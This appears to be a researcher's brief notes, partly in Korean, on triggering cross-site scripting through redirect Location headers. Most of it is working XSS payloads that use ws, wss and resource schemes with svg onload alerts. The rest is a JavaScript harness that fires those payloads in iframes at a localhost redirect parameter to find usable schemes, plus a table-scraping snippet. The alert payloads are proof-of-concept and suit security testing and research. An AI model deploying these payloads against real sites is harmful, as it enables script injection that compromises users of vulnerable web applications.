XSS in Redirect




#Location 우회


##chrome/firefox
ws://www.hahwul.com;"><svg/onload=alert(45)>
wss://www.hahwul.com;"><svg/onload=alert(45)>

##firefox
resource://www.hahwul.com;"><svg/onload=alert(45)>


#검증로직(스킴 찾기)

##
<div id="area"></div>

<script>
  function run(list) {
    list.forEach(function(scheme){
      var area = document.getElementById('area')
      var node = document.createElement('iframe');
      var payload = `http://localhost:8000/?redir=${scheme}://www.hahwul.com%0a%0d%0A%0d%%0A%0d%3Csvg/onload=alert('${scheme}://')%3E`
      node.src = payload
      node.style = 'width:2px; height:2px;'
      area.appendChild(node)
    })
  }
</script>





##
var arr = [];
var list = document.getElementsByTagName('tr');
Object.entries(list).forEach(function (v){
  if(v[1].childNodes[1] != undefined){
        arr.push(v[1].childNodes[1].innerText);
    }
})